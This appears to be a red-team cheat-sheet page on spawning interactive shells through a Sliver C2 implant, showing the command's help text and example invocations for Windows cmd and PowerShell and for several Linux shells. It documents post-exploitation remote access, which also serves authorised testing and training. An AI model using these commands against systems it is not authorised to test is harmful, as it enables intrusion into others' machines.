# 00 - Spawn Shell

### 00 - Help Menu

```
sliver (IMPLANT_NAME) > shell -h

Start an interactive shell

Usage:
======
  shell [flags]

Flags:
======
  -h, --help                 display help
  -y, --no-pty               disable use of pty on macos/linux
  -s, --shell-path string    path to shell interpreter
  -t, --timeout    int       command timeout in seconds (default: 60)
```

### - Usage

#### 1 - Windows

```
sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\cmd.exe"

sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe"

sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe"
```

#### 2 - Linux

```
sliver (IMPLANT_NAME) > shell -y -s /bin/sh

sliver (IMPLANT_NAME) > shell -y -s /bin/bash

sliver (IMPLANT_NAME) > shell -y -s /bin/zsh

sliver (IMPLANT_NAME) > shell -y -s /bin/dash

sliver (IMPLANT_NAME) > shell -y -s /bin/fish
```